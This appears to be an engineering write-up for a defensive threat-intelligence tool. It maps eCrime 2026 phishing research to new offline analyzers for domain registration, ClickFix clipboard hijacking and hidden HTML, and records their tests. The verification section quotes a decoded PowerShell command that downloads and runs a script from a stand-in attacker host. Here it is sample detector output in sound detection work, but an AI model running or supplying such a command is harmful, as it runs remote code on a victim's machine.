# APWG eCrime Research → CTI Expert Integration

Audit of the CTI Expert architecture against APWG eCrime research, a mapping of the most
useful/reproducible ideas to concrete capabilities, and the record of what was implemented in
this working session.

- **Sources studied:**
  - APWG eCrime research-paper index — https://ecrimeresearch.org/ecrime-research-papers
  - eCrime 2026 (Lisbon, Nov 2-6) program + Call for Papers — https://apwg.org/events/ecrime2026
  - eCrime 2026 Training-Day abstracts — https://apwg.org/apwg-ecrime-2026-training-sessions-2
- **Method:** read the 2026 accepted-paper / general-session list and training abstracts;
  audited the repo (scripts, techniques, intel_engine, tests, audit gate, guardrails);
  selected ideas that are (a) high-value for this tool's phishing/scam focus, (b) reproducible
  **keyless and offline**, and (c) testable deterministically; implemented, tested, documented.
- **Note on the author:** CTI Expert's maintainer (Hieu Ngo, ChongLuaDao) presents *"Scam
  Camps Signal Before They Scale: Building an Indicator Exchange Model for Preemptive
  Intervention"* at eCrime 2026 — the tool's exposure/indicator model is directly in this space.

---

## 1. Repository architecture audit (integration lens)

| Layer | What exists | Integration gap this work targets |
|-------|-------------|-----------------------------------|
| **Collector** (`scripts/`, `intel_engine/WebPivot`) | broad keyless collection: WHOIS, passive DNS, favicon/tracker pivots, wayback harvest, subdomains | Rich **registration/DNS features are collected but not scored** into a malicious-vs-compromised judgement |
| **Correlation** (`intel_engine/tools/kb`, `/clusters`) | KB, cross-case correlation, clustering with noise filters | Domain **clustering already covered** — matches the "Amplify the Signal" training; no new code needed |
| **Assessment** (`analysis/`, finding-framework, `/threat-model`) | exposure scoring, ACH, likelihood bands | No **page-content threat classifiers** (ClickFix, hidden-content) feeding assessment |
| **Guardrails** (`hooks/`, `audit.sh`, tests) | leak gate, action/session guards, zero-dep test suites, `@tool`/command-count invariants | New analyzers must be **keyless, offline, tested, and attribution-safe** to fit |

**Key finding:** the tool is strong on *infrastructure* collection/correlation but thin on
*page-content* characterization and on turning WHOIS/DNS into an explicit **maliciously-
registered vs compromised** call — the exact attribution split the eCrime survival research
formalizes, and the split most likely to cause a wrong accusation if left implicit.

Pre-existing observation (retained): the §3 three-layer command table carries some redundancy
and one orphan (`/fallback`); out of scope here (no command files added, so the audit gate's
command-count checks are untouched).

---

## 2. Research → capability mapping

| eCrime 2026 item (author / venue) | Idea | Reproducible? | Disposition |
|-----------------------------------|------|---------------|-------------|
| **Built to Last? Registration and DNS Strategies in Phishing Domain Survival** (Lim, Park, Sommese, Jonker, Mok, Claffy, Kim) | registration/DNS strategy predicts survival + separates malicious vs compromised | Yes — offline over collected WHOIS/DNS | **Implemented** → `phish_domain_survival.py` |
| **PasteJacked: Detection and Characterization of Clipboard-Hijacking Attacks** (Nabeel, Melicher, Starov — Palo Alto) | ClickFix clipboard-hijack: clipboard write + lure + OS-command payload | Yes — offline over page DOM/JS | **Implemented** → `clickfix_detect.py` (+ `-enc` base64 decode) |
| **Visibility-Aware HTML Analysis through Renderer-Level Extraction** (Betts, Spero, Biddle, Lottridge, Russello — Auckland) | raw HTML misleads; detect hidden/cloaked content | Partly — static approximation keyless; full needs renderer | **Implemented (static)** → `html_visibility_analysis.py`; renderer path noted (agent-browser/Playwright) |
| **Amplify the Signal: phishing campaigns through domain clustering** (Krohlas — Spamhaus, training) | pivot one report → clusters of sibling domains via passive DNS/shared indicators | Yes | **Already covered** by `/clusters` + passive DNS + `web-pivot.md`; referenced, no new code |
| **Modeling Adversaries Through Chaos / AAM** (Herzog — ISECOM, training) | state-based actor modeling (Mirror/Twin/Opposite/Lever) | Analytic method, not code | **Noted** — complements `/threat-model` ACH; candidate for an analytic-standards note |
| **A Tree-Structured Approach for Phishing Template & Attacker Attribution** (Vicomtech) | kit-template tree fingerprinting for attribution | Partly (needs kit corpus) | **Future** — extends clustering; needs template corpus not bundled here |
| **PhishTrace: Characterizing Phishing Websites from Dynamic Features** (Islam, Mannan) | dynamic runtime feature extraction | Needs sandboxed render | **Future** — pairs with the renderer path |
| **The "Allow" Reflex: Permission-Scope Misinterpretation** (UW) | mobile permission-scope misread | Adjacent to `BinaryPivot`/APK | **Future** — APK manifest permission-risk scoring |
| **Scam Camps Signal Before They Scale** (Ngo — ChongLuaDao) | preemptive indicator-exchange for scam camps | Aligned with existing exposure model | **Aligned** — no divergence needed |

Selection rationale: the three **Implemented** items are keyless, offline, deterministically
testable, and land squarely on this tool's phishing/scam mission while filling the audited
page-content and registration-classification gaps. Clustering was deliberately **not**
re-implemented because the repo already does it well.

---

## 3. What was implemented

All three follow the repo conventions: stdlib-only, PEP 723 `uv run` header, `_cli` +
`if __name__ == "__main__"`, text/JSON output, keyless, no network, no execution. Each fits
**AEAD** at the **Enrich → Assess** boundary and honors the attribution-safety rule (an
absent feature is "not assessed", never scored benign; a compromised domain is a victim).

1. **`scripts/phish_domain_survival.py`** — two-axis judgement: `registration_class`
   (maliciously_registered / likely_compromised / indeterminate) + `survival_outlook`, from
   age, reg→use gap, label entropy/shape, combosquat, TLD, registrar, nameserver posture, MX,
   privacy, content. Every signal auditable (axis/weight/reason); seed lists tunable via
   `--refs`. Technique: `techniques/phishing-domain-survival.md`.
2. **`scripts/clickfix_detect.py`** — ClickFix/PasteJacking detector over page DOM/JS: three
   co-occurring families (clipboard write · social lure · payload signature) → verdict; decodes
   PowerShell `-EncodedCommand` base64 (UTF-16LE) to surface the hidden C2 URL as an IOC; maps
   to ATT&CK T1204.004/T1059/T1071. Technique: `techniques/clickfix-clipboard-hijack.md`.
3. **`scripts/html_visibility_analysis.py`** — visibility-aware static analysis: inline +
   class-based hiding, hidden credential forms/inputs, hidden off-origin links, off-screen
   brand/lure text; severity by concealed intent + origin. Renderer-level upgrade path noted.
   Technique: `techniques/visibility-aware-html.md`.

---

## 4. Tests & verification

Zero-dependency suites (dual `python3 tests/x.py` + `pytest`), wired into `scripts/audit.sh` §6:

- `tests/test_phish_domain_survival.py` — the malicious/compromised split (RULE 5 safety),
  combosquat, honest degrade, determinism/bounds, auditability, entropy.
- `tests/test_clickfix_detect.py` — full-chain HIGH, co-occurrence logic, **false-positive
  guards** (coupon copy / prose "powershell" must not be HIGH), payload + `-enc`/URL extraction,
  structural "no network/exec" check.
- `tests/test_html_visibility_analysis.py` — hidden off-origin credential form HIGH, **CSRF
  no-false-positive**, class-based hiding, off-origin vs relative, malformed-markup degrade.

Verification performed this session: all three suites pass; scripts byte-compile; live smoke
runs produced the documented verdicts (incl. decoding `-enc` → `IEX(IRM http://evil.example/
a.ps1)`); `scripts/audit.sh` runs the new tests.

---

## 5. Limitations & unresolved questions

- **Heuristic weights** in the survival profiler encode the paper's *themes*, not its trained
  model; local telemetry should calibrate them via `--refs`.
- **Static page analysis** (ClickFix, visibility) can be evaded by runtime-assembled JS;
  renderer-level confirmation via the existing `agent-browser`/Playwright path is the upgrade
  and is called out in each module.
- **IEEE proceedings** for the 2026 papers are not yet public (camera-ready due Nov 30, 2026);
  mappings are grounded in titles/authors/CFP + training abstracts, and should be revisited
  against the published PDFs.
- **Follow-ups now delivered (second batch, v2.11):** the four items below were planned in
  `plans/260826-1935-ecrime-2026-followup-analyzers/` and implemented via `/ak:cook` — see §6.
- **Translated READMEs** (vi, zh-CN): the English README technique count/catalog was updated;
  the translated READMEs' technique counts were left for a translator pass (not gated by the
  audit, which checks command — not technique — counts).
- **Optional wiring:** these analyzers ship as standalone CLIs (matching `iban_analyze.py` /
  `lunar_domain_exposure.py`); wiring them as `pivot_orchestrator` edge-matrix steps or new
  `/slash` commands is a deliberate follow-up (adding commands triggers the 3-README
  command-count gate).

---

## 6. Second batch (v2.11) — follow-up phases delivered

Executed from `plans/260826-1935-ecrime-2026-followup-analyzers/`. Same contracts as batch one
(keyless core, offline zero-dep tests in `audit.sh`, attribution-safety / RULE 5).

| Phase | eCrime 2026 source | Module(s) | Test |
|-------|--------------------|-----------|------|
| APK permission-scope | The "Allow" Reflex (UW) | `scripts/apk_permission_scope.py` (+ UTF-8/UTF-16 AXML decode, zero-perm degrade guard) | `tests/test_apk_permission_scope.py` |
| Kit-template attribution | Tree-Structured Attribution (Vicomtech) | `scripts/kit_template_fingerprint.py` (commodity-trap guard, never auto-merge) | `tests/test_kit_template_fingerprint.py` |
| Renderer confirmation | PasteJacked + Visibility-Aware HTML | `scripts/render_confirm.py` + evidence-seams in `clickfix_detect.py`/`html_visibility_analysis.py` | `tests/test_render_confirm.py` |
| PhishTrace dynamic features | PhishTrace (McGill/Concordia) | `scripts/phishtrace_features.py` | `tests/test_phishtrace_features.py` |
| AAM actor-modeling | Modeling Adversaries Through Chaos (ISECOM) | `handbook/aam-actor-modeling.md` (docs-only `/threat-model` overlay) | n/a (docs) |

### Shared conventions (Phase 1 foundation)

- **Grading / held-pending-corroboration.** Uncertain links are graded and *held*, never
  auto-promoted: kit-template match → `lineage_low_confidence` (corroborate before same-operator);
  PhishTrace exfil hosts → IOCs, not attribution; APK score → capability, not guilt.
- **Injectable rendered-evidence seam.** `clickfix_detect.detect(text, captured_clipboard=...)` and
  `html_visibility_analysis.analyze(html, computed_hidden=...)` accept renderer-captured evidence
  additively; absent it, static behaviour is byte-identical (seam-additivity is tested).
- **Optional-dependency policy.** Renderer (Playwright/agent-browser) and richer APK decoders
  (androguard) are optional and **degrade to a note**, never a hard failure or a false-clean.
- **No new command files.** All batch-two capabilities ship as scripts + technique docs, so the
  audit's command-count / 3-README gate stays untouched.
